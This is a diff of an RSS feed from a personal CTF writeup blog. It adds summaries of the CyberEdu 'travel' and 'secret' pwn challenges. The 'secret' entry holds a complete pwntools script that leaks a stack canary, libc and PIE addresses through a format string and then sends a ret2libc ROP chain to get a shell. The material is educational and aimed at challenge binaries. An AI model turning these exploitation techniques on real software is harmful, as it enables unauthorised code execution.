@@ -6,24 +6,91 @@
     <description>Recent content in Buffer-Overflow on Irina&#39;s CTF Writeups</description>
     <generator>Hugo -- 0.146.0</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 28 Dec 2025 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 03 Jan 2026 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://irinasusca.github.io/writeup-blog/tags/buffer-overflow/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>CyberEdu offensive-honeypot Writeup</title>
-      <link>https://irinasusca.github.io/writeup-blog/posts/offensivehoneypot-writeup/</link>
-      <pubDate>Sun, 28 Dec 2025 00:00:00 +0000</pubDate>
-      <guid>https://irinasusca.github.io/writeup-blog/posts/offensivehoneypot-writeup/</guid>
-      <description>&lt;h2 id=&#34;challenge-overview&#34;&gt;Challenge overview&lt;/h2&gt;
-&lt;p&gt;Just another &lt;strong&gt;&lt;a href=&#34;https://app.cyber-edu.co/challenges/559cb970-7f21-11ea-a99e-2f006e8673c3?tenant=cyberedu&#34;&gt;pwn challenge&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/offensivehoneypot-writeup/pic1.png#center&#34;&gt;&lt;/p&gt;
-&lt;p&gt;We&amp;rsquo;re dealing with a little game, and a canary.&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/offensivehoneypot-writeup/pic2.png#center&#34;&gt;&lt;/p&gt;
-&lt;p&gt;The win condition is that we beat the game, by killing the &lt;em&gt;hacker&lt;/em&gt; player.&lt;/p&gt;
+      <title>CyberEdu travel Writeup</title>
+      <link>https://irinasusca.github.io/writeup-blog/posts/travel-writeup/</link>
+      <pubDate>Sat, 03 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>https://irinasusca.github.io/writeup-blog/posts/travel-writeup/</guid>
+      <description>&lt;p&gt;Happy New Year! 🎇&lt;/p&gt;
+&lt;h2 id=&#34;challenge-overview&#34;&gt;Challenge overview&lt;/h2&gt;
+&lt;p&gt;Travel agency as a &lt;strong&gt;&lt;a href=&#34;https://app.cyber-edu.co/challenges/05090610-44a4-11ed-ba64-0fbb056be1da?tenant=cyberedu&#34;&gt;service&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/travel-writeup/pic1.png#center&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;re given a &lt;code&gt;libc.so.6&lt;/code&gt; and a &lt;strong&gt;main&lt;/strong&gt; 64-bit binary, with &lt;code&gt;NX&lt;/code&gt;, &lt;code&gt;PIE&lt;/code&gt; and a canary enabled. We immediately bump into a format string vulnerability.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/travel-writeup/pic2.png#center&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We only have one function, &lt;code&gt;main&lt;/code&gt;, and a buffer overflow along the format string. So we can start trying to leak the canary, PIE base and libc.&lt;/p&gt;
+&lt;p&gt;So, PIE ret2libc with a canary.&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;identifying-the-vulnerabilities&#34;&gt;Identifying the vulnerabilities&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/offensivehoneypot-writeup/pic3.png#center&#34;&gt;&lt;/p&gt;
-&lt;p&gt;The vulnerability here is that we can calculate the &lt;em&gt;random&lt;/em&gt; number ourselves, very similarly to another challenge I wrote the writeup for &lt;strong&gt;&lt;a href=&#34;https://irinasusca.github.io/writeup-blog/posts/babyfmt-writeup/&#34;&gt;here&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;Since we know the seed ourselves, we can get the same value for &lt;code&gt;rand()&lt;/code&gt; that the game gets.&lt;/p&gt;</description>
+&lt;p&gt;There&amp;rsquo;s a little problem though. The canary was at offset &lt;code&gt;%33$p&lt;/code&gt;, the PIE base at &lt;code&gt;%37$p&lt;/code&gt;, the maybe-libc at &lt;code&gt;%35$p&lt;/code&gt;. From the first input, we can find out two addresses, and from the second input, the remaining one; but that&amp;rsquo;s when we send out payload, and we need to know all three of them for a successful payload.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>CyberEdu secret Writeup</title>
+      <link>https://irinasusca.github.io/writeup-blog/posts/secret-writeup/</link>
+      <pubDate>Tue, 30 Dec 2025 00:00:00 +0000</pubDate>
+      <guid>https://irinasusca.github.io/writeup-blog/posts/secret-writeup/</guid>
+      <description>&lt;h2 id=&#34;challenge-overview&#34;&gt;Challenge overview&lt;/h2&gt;
+&lt;p&gt;Just another pwn &lt;strong&gt;&lt;a href=&#34;https://app.cyber-edu.co/challenges/559e4ec0-7f21-11ea-b4cb-3db05c1cfb77?tenant=cyberedu&#34;&gt;challenge&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/secret-writeup/pic1.png#center&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Straight away, we&amp;rsquo;re dealing with a 64-bit PIE with canary enabled, and a format string vulnerability, and a &lt;code&gt;gets(v1)&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The format string vulnerability is in &lt;code&gt;main&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/secret-writeup/pic2.png#center&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And here is the &lt;code&gt;gets(v1)&lt;/code&gt; that allows us to buffer overflow:&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/secret-writeup/pic3.png#center&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So, ret2libc with a canary.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;the-exploit&#34;&gt;The exploit&lt;/h2&gt;
+&lt;p&gt;We quickly gain shell locally using this script (first try!):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# %15$p is the canary&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# %17$p  is libc + 0x1f68&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# %19$p is PIE + 0xb6d&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#to use gadgets we need to leak PIE base too&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name_payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%15$p.%17$p.%19$p&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Name: &amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(name_payload)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hillo &amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;leaks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;canary, libc_leak, pie_leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leaks&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;canary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(canary, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc_leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(libc_leak, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pie_leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(pie_leak, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;canary: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(canary)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc leak: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(libc_leak)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pie leak: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(libc_leak)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_leak &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1f68&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pie &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pie_leak &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xb6d&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#local&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;binsh_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17fe3c&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;system_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2b910&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pop_rdi_ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xca3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pie
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x889&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pie
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;system &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; system_offset
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;binsh &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; binsh_offset
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Phrase: &amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ( &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;136&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;#s1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    p64(canary) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;#rbp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    p64(pop_rdi_ret) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    p64(binsh) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    p64(ret) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    p64(system)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For the remote instance, we most probably need to recalculate the offsets, for both the different &lt;code&gt;glibc&lt;/code&gt; version and the format strings. I found the format string differences easily:&lt;/p&gt;</description>
     </item>
     <item>
       <title>CyberEdu darkmagic Writeup</title>
